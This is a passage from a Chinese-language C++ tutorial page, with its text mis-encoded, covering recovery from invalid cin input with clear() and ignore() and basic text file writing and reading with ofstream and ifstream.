class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// è¯»å–å¤±è´¥ (è¾“å…¥äº†éæ•°å­—æˆ– EOF)</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Invalid input detected or EOF reached.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æ£€æŸ¥æ˜¯å¦æ˜¯æ–‡ä»¶ç»“æŸç¬¦ (EOF)</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span>.eof()) &#123;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;End of file reached. Exiting.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                <span class="keyword">break</span>; <span class="comment">// å¦‚æœæ˜¯ EOFï¼Œç›´æ¥é€€å‡ºå¾ªç¯</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æ¸…é™¤é”™è¯¯æ ‡å¿—ï¼Œä½¿ cin æ¢å¤æ­£å¸¸</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Clearing error state...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cin</span>.clear();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ä¸¢å¼ƒç¼“å†²åŒºä¸­å¯¼è‡´é”™è¯¯çš„æ— æ•ˆè¾“å…¥ï¼Œç›´åˆ°æ¢è¡Œç¬¦</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Discarding invalid input...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cin</span>.ignore(<span class="built_in">std</span>::numeric_limits&lt;<span class="built_in">std</span>::streamsize&gt;::max(), <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Please try entering a number again, or press Ctrl+Z/Ctrl+D to exit.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="comment">// æ³¨æ„ï¼šåœ¨è¿™ä¸ªç‰ˆæœ¬ä¸­ï¼Œé‡åˆ°éæ•°å­—è¾“å…¥åï¼Œæˆ‘ä»¬æç¤ºç”¨æˆ·é‡è¯•æˆ–é€€å‡ºï¼Œ</span></span><br><span class="line">            <span class="comment">// è€Œä¸æ˜¯åƒç¬¬ä¸€ä¸ªä¾‹å­é‚£æ ·ç›´æ¥ç»ˆæ­¢æ±‚å’Œã€‚</span></span><br><span class="line">            <span class="comment">// å¦‚æœå¸Œæœ›é‡åˆ°éæ•°å­—å°±é€€å‡ºï¼Œå¯ä»¥åœ¨ else å—çš„æœ«å°¾åŠ ä¸Š break;</span></span><br><span class="line">            <span class="comment">// break; // å–æ¶ˆæ³¨é‡Šæ­¤è¡Œï¼Œåˆ™é‡åˆ°éæ•°å­—è¾“å…¥æ—¶é€€å‡ºå¾ªç¯</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nLoop finished.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Final sum: &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¯ä»¥åœ¨è¿™é‡Œå°è¯•è¯»å–å…¶ä»–è¾“å…¥ï¼Œå› ä¸ºé”™è¯¯çŠ¶æ€å·²è¢«æ¸…é™¤</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> remaining_input;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nEnter some text: &quot;</span>;</span><br><span class="line">    <span class="comment">// éœ€è¦å…ˆå¿½ç•¥æ‰ä¸Šæ¬¡è¾“å…¥ç•™ä¸‹çš„æ¢è¡Œç¬¦ï¼ˆå¦‚æœå­˜åœ¨ï¼‰</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span>.peek() == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cin</span>.ignore();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::getline(<span class="built_in">std</span>::<span class="built_in">cin</span>, remaining_input);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You entered: &quot;</span> &lt;&lt; remaining_input &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä»£ç è§£é‡Š:</strong></p><ol><li> ä½¿ç”¨ <code>while(true)</code> åˆ›å»ºä¸€ä¸ªçœ‹ä¼¼æ— é™çš„å¾ªç¯ï¼Œé€€å‡ºé€»è¾‘æ”¾åœ¨å¾ªç¯å†…éƒ¨ã€‚</li><li> <code>if (std::cin &gt;&gt; input_number)</code> å°è¯•è¯»å–æ•°å­—ã€‚</li><li> å¦‚æœæˆåŠŸï¼Œæ‰§è¡ŒåŠ æ³•ã€‚</li><li>å¦‚æœå¤±è´¥ (<code>else</code> å—)ï¼š<ul><li>  æ‰“å°é”™è¯¯æ¶ˆæ¯ã€‚</li><li>  æ£€æŸ¥æ˜¯å¦æ˜¯æ–‡ä»¶ç»“æŸç¬¦ (<code>std::cin.eof()</code>)ï¼Œå¦‚æœæ˜¯åˆ™ <code>break</code>ã€‚</li><li>  è°ƒç”¨ <code>std::cin.clear()</code> æ¸…é™¤ <code>failbit</code> ç­‰é”™è¯¯çŠ¶æ€ã€‚</li><li>  è°ƒç”¨ <code>std::cin.ignore(...)</code> æ¥ä¸¢å¼ƒç¼“å†²åŒºä¸­çš„æ— æ•ˆè¾“å…¥ã€‚<code>std::numeric_limits&lt;std::streamsize&gt;::max()</code> è¡¨ç¤ºå¿½ç•¥å°½å¯èƒ½å¤šçš„å­—ç¬¦ï¼Œç›´åˆ°é‡åˆ°æ¢è¡Œç¬¦ <code>\n</code>ã€‚è¿™ç¡®ä¿äº†ä¸‹ä¸€æ¬¡å¾ªç¯è¿­ä»£æ—¶ï¼Œ<code>std::cin</code> ä¸ä¼šå†æ¬¡è¯»å–ç›¸åŒçš„æ— æ•ˆè¾“å…¥ã€‚</li><li>  æ ¹æ®éœ€è¦ï¼Œå¯ä»¥é€‰æ‹© <code>break</code> é€€å‡ºï¼Œæˆ–è€…è®©å¾ªç¯ç»§ç»­ï¼Œæç¤ºç”¨æˆ·é‡æ–°è¾“å…¥ã€‚</li></ul></li></ol><p>è¿™ç§æ¨¡å¼åœ¨éœ€è¦ä»ç”¨æˆ·é‚£é‡Œå¯é åœ°è¯»å–æ•°å­—è¾“å…¥æ—¶éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºå®ƒèƒ½ä¼˜é›…åœ°å¤„ç†è¾“å…¥é”™è¯¯ï¼Œè€Œä¸æ˜¯è®©ç¨‹åºå› ä¸ºæ„å¤–çš„è¾“å…¥è€Œå´©æºƒæˆ–è¡Œä¸ºå¼‚å¸¸ã€‚</p><h2 id="6-8-ç®€å•æ–‡ä»¶è¾“å…¥-è¾“å‡º"><a href="#6-8-ç®€å•æ–‡ä»¶è¾“å…¥-è¾“å‡º" class="headerlink" title="6.8 ç®€å•æ–‡ä»¶è¾“å…¥/è¾“å‡º"></a>6.8 ç®€å•æ–‡ä»¶è¾“å…¥/è¾“å‡º</h2><p>åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬ä¸»è¦ä½¿ç”¨ <code>cin</code> ä»é”®ç›˜è¯»å–è¾“å…¥ï¼Œç”¨ <code>cout</code> å‘å±å¹•æ˜¾ç¤ºè¾“å‡ºã€‚C++ è¿˜æä¾›äº†å¼ºå¤§çš„åŠŸèƒ½ï¼Œå¯ä»¥è®©æˆ‘ä»¬å°†æ•°æ®å†™å…¥æ–‡ä»¶æˆ–ä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®ã€‚è¿™å¯¹äºå­˜å‚¨ç¨‹åºè¿è¡Œç»“æœã€è¯»å–é…ç½®æ–‡ä»¶æˆ–å¤„ç†å¤§é‡æ•°æ®è‡³å…³é‡è¦ã€‚æœ¬èŠ‚å°†ä»‹ç»åŸºæœ¬çš„æ–‡æœ¬æ–‡ä»¶è¾“å…¥/è¾“å‡ºï¼ˆI/Oï¼‰æ“ä½œã€‚</p><h3 id="6-8-1-æ–‡æœ¬-I-O-å’Œæ–‡æœ¬æ–‡ä»¶"><a href="#6-8-1-æ–‡æœ¬-I-O-å’Œæ–‡æœ¬æ–‡ä»¶" class="headerlink" title="6.8.1 æ–‡æœ¬ I/O å’Œæ–‡æœ¬æ–‡ä»¶"></a>6.8.1 æ–‡æœ¬ I/O å’Œæ–‡æœ¬æ–‡ä»¶</h3><p>æ–‡ä»¶ I/O ä¸»è¦æœ‰ä¸¤ç§æ¨¡å¼ï¼šæ–‡æœ¬æ¨¡å¼å’ŒäºŒè¿›åˆ¶æ¨¡å¼ã€‚</p><ul><li><p>  <strong>æ–‡æœ¬æ–‡ä»¶ (Text File):</strong> æ–‡æœ¬æ–‡ä»¶å­˜å‚¨çš„æ˜¯äººç±»å¯è¯»çš„å­—ç¬¦åºåˆ—ã€‚æ–‡ä»¶ä¸­çš„æ•°æ®è¢«è§£é‡Šä¸ºå­—ç¬¦ï¼Œæ•°å­—ï¼ˆå¦‚ <code>123</code>ï¼‰ä¼šè¢«å­˜å‚¨ä¸ºå­—ç¬¦åºåˆ—ï¼ˆ<code>&#39;1&#39;</code>, <code>&#39;2&#39;</code>, <code>&#39;3&#39;</code>ï¼‰ã€‚åœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸Šï¼Œæ–‡æœ¬æ–‡ä»¶å¯¹è¡Œå°¾çš„å¤„ç†å¯èƒ½ä¸åŒï¼ˆä¾‹å¦‚ï¼ŒWindows ä½¿ç”¨å›è½¦+æ¢è¡Œ <code>\r\n</code>ï¼ŒUnix/Linux ä½¿ç”¨æ¢è¡Œ <code>\n</code>ï¼‰ã€‚C++ çš„æ–‡æœ¬ I/O ä¼šè‡ªåŠ¨å¤„ç†è¿™äº›è¡Œå°¾è½¬æ¢ï¼Œä½¿å¾—ä»£ç æ›´å…·å¯ç§»æ¤æ€§ã€‚æˆ‘ä»¬é€šå¸¸ä½¿ç”¨ <code>&lt;&lt;</code> å’Œ <code>&gt;&gt;</code> æˆ– <code>getline</code> ç­‰å‡½æ•°æ¥å¤„ç†æ–‡æœ¬æ–‡ä»¶ã€‚</p></li><li><p>  <strong>äºŒè¿›åˆ¶æ–‡ä»¶ (Binary File):</strong> äºŒè¿›åˆ¶æ–‡ä»¶å­˜å‚¨çš„æ˜¯æ•°æ®çš„åŸå§‹å­—èŠ‚è¡¨ç¤ºã€‚æ•°å­— <code>123</code> ä¼šè¢«å­˜å‚¨ä¸ºå…¶åœ¨å†…å­˜ä¸­çš„äºŒè¿›åˆ¶å½¢å¼ï¼ˆä¾‹å¦‚ï¼Œä¸€ä¸ª 4 å­—èŠ‚çš„ <code>int</code>ï¼‰ã€‚äºŒè¿›åˆ¶ I/O ä¸è¿›è¡Œä»»ä½•å­—ç¬¦è½¬æ¢æˆ–è¡Œå°¾å¤„ç†ï¼Œè¯»å†™é€Ÿåº¦é€šå¸¸æ›´å¿«ï¼Œæ–‡ä»¶ä¹Ÿå¯èƒ½æ›´å°ï¼Œä½†å†…å®¹é€šå¸¸ä¸æ˜¯äººç±»ç›´æ¥å¯è¯»çš„ã€‚å¤„ç†äºŒè¿›åˆ¶æ–‡ä»¶é€šå¸¸ä½¿ç”¨ <code>read()</code> å’Œ <code>write()</code> æˆå‘˜å‡½æ•°ã€‚</p></li></ul><p>æœ¬èŠ‚é‡ç‚¹ä»‹ç»<strong>æ–‡æœ¬æ–‡ä»¶</strong>çš„ I/O æ“ä½œã€‚</p><h3 id="6-8-2-å†™å…¥åˆ°æ–‡æœ¬æ–‡ä»¶ä¸­"><a href="#6-8-2-å†™å…¥åˆ°æ–‡æœ¬æ–‡ä»¶ä¸­" class="headerlink" title="6.8.2 å†™å…¥åˆ°æ–‡æœ¬æ–‡ä»¶ä¸­"></a>6.8.2 å†™å…¥åˆ°æ–‡æœ¬æ–‡ä»¶ä¸­</h3><p>è¦å°†æ•°æ®å†™å…¥æ–‡æœ¬æ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ C++ çš„æ–‡ä»¶æµåº“ <code>&lt;fstream&gt;</code>ã€‚</p><p><strong>æ­¥éª¤:</strong></p><ol><li> <strong>åŒ…å«å¤´æ–‡ä»¶:</strong> <code>#include &lt;fstream&gt;</code></li><li><strong>åˆ›å»º <code>ofstream</code> å¯¹è±¡:</strong> <code>ofstream</code> ç±»ï¼ˆoutput file streamï¼‰ç”¨äºå‘æ–‡ä»¶å†™å…¥æ•°æ®ã€‚ä½ éœ€è¦åˆ›å»ºä¸€ä¸ªè¯¥ç±»çš„å¯¹è±¡ï¼Œå¹¶åœ¨åˆ›å»ºæ—¶æˆ–ä¹‹åå°†å…¶ä¸ä¸€ä¸ªæ–‡ä»¶åå…³è”èµ·æ¥ã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::ofstream outputFile; <span class="comment">// åˆ›å»º ofstream å¯¹è±¡</span></span><br><span class="line">outputFile.open(<span class="string">&quot;mydata.txt&quot;</span>); <span class="comment">// å°†å¯¹è±¡ä¸æ–‡ä»¶å…³è”ï¼ˆå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™åˆ›å»ºï¼Œå¦‚æœå­˜åœ¨åˆ™æ¸…ç©ºå†…å®¹ï¼‰</span></span><br><span class="line"><span class="comment">// æˆ–è€…åœ¨åˆ›å»ºæ—¶ç›´æ¥å…³è”</span></span><br><span class="line"><span class="comment">// std::ofstream outputFile(&quot;mydata.txt&quot;);</span></span><br></pre></td></tr></table></figure></li><li><strong>æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æˆåŠŸæ‰“å¼€:</strong> åœ¨å°è¯•å†™å…¥ä¹‹å‰ï¼Œæœ€å¥½æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æˆåŠŸæ‰“å¼€ã€‚å¯ä»¥ä½¿ç”¨ <code>is_open()</code> æ–¹æ³•æˆ–ç›´æ¥æ£€æŸ¥æµå¯¹è±¡çš„çŠ¶æ€ã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!outputFile.is_open()) &#123; <span class="comment">// æˆ–è€… if (!outputFile)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error opening file for writing!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// æˆ–è€…è¿›è¡Œå…¶ä»–é”™è¯¯å¤„ç†</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong>å†™å…¥æ•°æ®:</strong> ä½¿ç”¨ä¸ <code>cout</code> ç±»ä¼¼çš„ <code>&lt;&lt;</code> è¿ç®—ç¬¦å°†æ•°æ®å†™å…¥æ–‡ä»¶æµã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> year = <span class="number">2024</span>;</span><br><span class="line"><span class="keyword">double</span> price = <span class="number">99.99</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> item = <span class="string">&quot;Gadget&quot;</span>;</span><br><span class="line">outputFile &lt;&lt; <span class="string">&quot;Item: &quot;</span> &lt;&lt; item &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">outputFile &lt;&lt; <span class="string">&quot;Year: &quot;</span> &lt;&lt; year &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">outputFile &lt;&lt; <span class="string">&quot;Price: &quot;</span> &lt;&lt; price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure></li><li><strong>å…³é—­æ–‡ä»¶:</strong> å®Œæˆå†™å…¥åï¼Œåº”è¯¥å…³é—­æ–‡ä»¶ä»¥ç¡®ä¿æ‰€æœ‰æ•°æ®éƒ½è¢«åˆ·æ–°ï¼ˆå†™å…¥ï¼‰åˆ°ç£ç›˜ï¼Œå¹¶é‡Šæ”¾æ–‡ä»¶èµ„æºã€‚å¯ä»¥æ˜¾å¼è°ƒç”¨ <code>close()</code> æ–¹æ³•ï¼Œæˆ–è€…å½“ <code>ofstream</code> å¯¹è±¡ç¦»å¼€å…¶ä½œç”¨åŸŸæ—¶ï¼ˆä¾‹å¦‚å‡½æ•°ç»“æŸï¼‰ï¼Œå…¶ææ„å‡½æ•°ä¼šè‡ªåŠ¨å…³é—­æ–‡ä»¶ã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outputFile.close(); <span class="comment">// æ˜¾å¼å…³é—­</span></span><br></pre></td></tr></table></figure></li></ol><p><strong>ç¤ºä¾‹ä»£ç :</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt; // åŒ…å«æ–‡ä»¶æµå¤´æ–‡ä»¶</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1. åˆ›å»º ofstream å¯¹è±¡å¹¶å…³è”æ–‡ä»¶</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ofstream <span class="title">outFile</span><span class="params">(<span class="string">&quot;report.txt&quot;</span>)</span></span>; <span class="comment">// å°è¯•æ‰“å¼€/åˆ›å»º report.txt</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æˆåŠŸæ‰“å¼€</span></span><br><span class="line">    <span class="keyword">if</span> (!outFile.is_open()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Could not open report.txt for writing.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// è¿”å›é”™è¯¯ç </span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. å†™å…¥æ•°æ®</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Writing data to report.txt...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    outFile &lt;&lt; <span class="string">&quot;--- Sales Report ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    outFile &lt;&lt; <span class="string">&quot;Product: Laptop&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    outFile &lt;&lt; <span class="string">&quot;Quantity: 15&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    outFile &lt;&lt; <span class="string">&quot;Revenue: &quot;</span> &lt;&lt; <span class="number">15</span> * <span class="number">1200.50</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    outFile &lt;&lt; <span class="string">&quot;--------------------&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. å…³é—­æ–‡ä»¶ (è™½ç„¶ææ„å‡½æ•°ä¼šè‡ªåŠ¨å…³é—­ï¼Œä½†æ˜¾å¼å…³é—­æ˜¯å¥½ä¹ æƒ¯)</span></span><br><span class="line">    outFile.close();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Data written successfully.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œæ­¤ç¨‹åºåï¼Œå°†åœ¨ç¨‹åºæ‰€åœ¨çš„ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º <code>report.txt</code> çš„æ–‡ä»¶ï¼ˆå¦‚æœä¸å­˜åœ¨ï¼‰ï¼Œå…¶å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--- Sales Report ---</span><br><span class="line">Product: Laptop</span><br><span class="line">Quantity: 15</span><br><span class="line">Revenue: 18007.5</span><br><span class="line">--------------------</span><br></pre></td></tr></table></figure><h3 id="6-8-3-è¯»å–æ–‡æœ¬æ–‡ä»¶"><a href="#6-8-3-è¯»å–æ–‡æœ¬æ–‡ä»¶" class="headerlink" title="6.8.3 è¯»å–æ–‡æœ¬æ–‡ä»¶"></a>6.8.3 è¯»å–æ–‡æœ¬æ–‡ä»¶</h3><p>ä»æ–‡æœ¬æ–‡ä»¶è¯»å–æ•°æ®ä¸å†™å…¥ç±»ä¼¼ï¼Œä½†ä½¿ç”¨ <code>ifstream</code> ç±»ï¼ˆinput file streamï¼‰ã€‚</p><p><strong>æ­¥éª¤:</strong></p><ol><li><p> <strong>åŒ…å«å¤´æ–‡ä»¶:</strong> <code>#include &lt;fstream&gt;</code></p></li><li><p><strong>åˆ›å»º <code>ifstream</code> å¯¹è±¡:</strong> åˆ›å»ºä¸€ä¸ª <code>ifstream</code> å¯¹è±¡å¹¶å°†å…¶ä¸è¦è¯»å–çš„æ–‡ä»¶åå…³è”ã€‚</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::ifstream inputFile; <span class="comment">// åˆ›å»º ifstream å¯¹è±¡</span></span><br><span class="line">inputFile.open(<span class="string">&quot;mydata.txt&quot;</span>); <span class="comment">// å°†å¯¹è±¡ä¸æ–‡ä»¶å…³è”ä»¥ä¾›è¯»å–</span></span><br><span class="line"><span class="comment">// æˆ–è€…åœ¨åˆ›å»ºæ—¶ç›´æ¥å…³è”</span></span><br><span class="line"><span class="comment">// std::ifstream inputFile(&quot;mydata.txt&quot;);</span></span><br></pre></td></tr></table></figure></li><li><p><strong>æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æˆåŠŸæ‰“å¼€:</strong> åŒæ ·ï¼Œæ£€æŸ¥æ–‡ä»¶æ˜¯å¦æˆåŠŸæ‰“å¼€è‡³å…³é‡è¦ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨æˆ–æ— æ³•è®¿é—®ï¼Œæ‰“å¼€æ“ä½œä¼šå¤±è´¥ã€‚</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!inputFile.is_open()) &#123; <span class="comment">// æˆ–è€… if (!inputFile)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error opening file for reading!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>è¯»å–æ•°æ®:</strong> å¯ä»¥ä½¿ç”¨ä¸ <code>cin</code> ç±»ä¼¼çš„ <code>&gt;&gt;</code> è¿ç®—ç¬¦æ¥è¯»å–ç”±ç©ºæ ¼åˆ†éš”çš„æ•°æ®ï¼Œæˆ–è€…ä½¿ç”¨ <code>std::getline()</code> æ¥è¯»å–æ•´è¡Œã€‚è¯»å–æ“ä½œé€šå¸¸æ”¾åœ¨å¾ªç¯ä¸­ï¼Œç›´åˆ°åˆ°è¾¾æ–‡ä»¶æœ«å°¾ã€‚</p><ul><li>  <strong>ä½¿ç”¨ <code>&gt;&gt;</code> è¯»å–:</strong> å®ƒä¼šè·³è¿‡å‰å¯¼ç©ºç™½ï¼ˆç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ï¼‰ï¼Œç„¶åè¯»å–ç›´åˆ°é‡åˆ°ä¸‹ä¸€ä¸ªç©ºç™½å­—ç¬¦ã€‚</li><li>  <strong>ä½¿ç”¨ <code>std::getline(inputFile, lineString)</code> è¯»å–:</strong> å®ƒä¼šè¯»å–æ•´è¡Œï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰ï¼Œç›´åˆ°é‡åˆ°æ¢è¡Œç¬¦ <code>\n</code> ä¸ºæ­¢ï¼ˆæ¢è¡Œç¬¦æœ¬èº«ä¼šè¢«è¯»å–å¹¶ä¸¢å¼ƒï¼‰ã€‚</li></ul></li><li><p><strong>æ£€æŸ¥æ–‡ä»¶æœ«å°¾ (EOF):</strong> å½“å°è¯•è¯»å–ä½†å·²æ— æ•°æ®å¯è¯»æ—¶ï¼ˆåˆ°è¾¾æ–‡ä»¶æœ«å°¾ï¼‰ï¼Œè¾“å…¥æµä¼šè¿›å…¥ç‰¹æ®ŠçŠ¶æ€ã€‚å¾ªç¯é€šå¸¸ä¾èµ–äºæ£€æŸ¥æµçš„çŠ¶æ€æ¥ç»ˆæ­¢ã€‚</p><ul><li>  <code>while (inputFile &gt;&gt; variable)</code>: å½“ <code>&gt;&gt;</code> æˆåŠŸè¯»å–æ—¶ï¼ŒæµçŠ¶æ€ä¸º <code>true</code>ï¼Œå¾ªç¯ç»§ç»­ï¼›åˆ°è¾¾æ–‡ä»¶æœ«å°¾æˆ–é‡åˆ°æ— æ•ˆæ•°æ®æ—¶ï¼ŒçŠ¶æ€å˜ä¸º <code>false</code>ï¼Œå¾ªç¯ç»ˆæ­¢ã€‚</li><li>  <code>while (std::getline(inputFile, lineString))</code>: å½“ <code>getline</code> æˆåŠŸè¯»å–ä¸€è¡Œæ—¶ï¼ŒæµçŠ¶æ€ä¸º <code>true</code>ï¼›åˆ°è¾¾æ–‡ä»¶æœ«å°¾æ—¶ï¼ŒçŠ¶æ€å˜ä¸º <code>false</code>ã€‚</li></ul></li><li><p><strong>å…³é—­æ–‡ä»¶:</strong> è¯»å–å®Œæˆåï¼Œå…³é—­æ–‡ä»¶ã€‚åŒæ ·ï¼Œå¯ä»¥æ˜¾å¼è°ƒç”¨ <code>close()</code>ï¼Œæˆ–è€…ä¾èµ–å¯¹è±¡çš„ææ„å‡½æ•°ã€‚</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inputFile.close();</span><br></pre></td></tr></table></figure></li></ol><p><strong>ç¤ºä¾‹ä»£ç  (è¯»å– <code>report.txt</code>):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 